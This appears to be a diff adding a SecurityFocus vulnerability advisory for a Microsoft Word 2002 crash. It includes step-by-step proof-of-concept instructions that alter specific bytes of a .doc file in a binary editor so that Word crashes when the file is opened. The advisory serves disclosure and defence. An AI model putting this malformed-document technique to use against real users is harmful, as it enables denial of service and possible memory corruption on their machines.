@@ -1,0 +1,24 @@
+source: http://www.securityfocus.com/bid/8761/info
+
+It has been reported that Microsoft Word is prone to a vulnerability that may allow an attacker to crash the software. The problem occurs when an attacker modifies the memory structure of a Word document. If a user opens the malformed document, it would cause the software to crash. This could potentially allow for corruption of memory, resulting in a possibility of arbitrary code execution, though this has not been confirmed. 
+
+1. Open Word.
+2. Save .doc file.
+3. Modify .doc file by using binary editor as follows:
+
+these lines were taken from .doc file of Microsoft Word 2002(10.2627.3311):
+
+00 00 00 00 00 a3 05 00 00 00 00 00 00 00 00 00 00 00 00 00 00 40 01
+00 00 00 00 00 00 b4 01 00 00 20 00 00 00 9c 01 00 00 00 00 00 00 9c
+01 00 00 00 00 00 00 9c 01 00 00 00 00 00 00 9c 01 00 00 00 00 00 00
+-------
+
+4. Change them as follows:
+
+00 00 00 00 00 a3 05 00 00 00 00 00 00 00 00 00 00 00 00 00 00 40 01
+00 00 62 62 62 62 b4 01 00 00 20 00 00 00 9c 01 00 00 00 00 00 00 9c
+01 00 00 00 00 00 00 9c 01 00 00 00 00 00 00 9c 01 00 00 00 00 00 00
+-------
+
+5. Open modified .doc file.
+6. Microsoft Word will crashes.
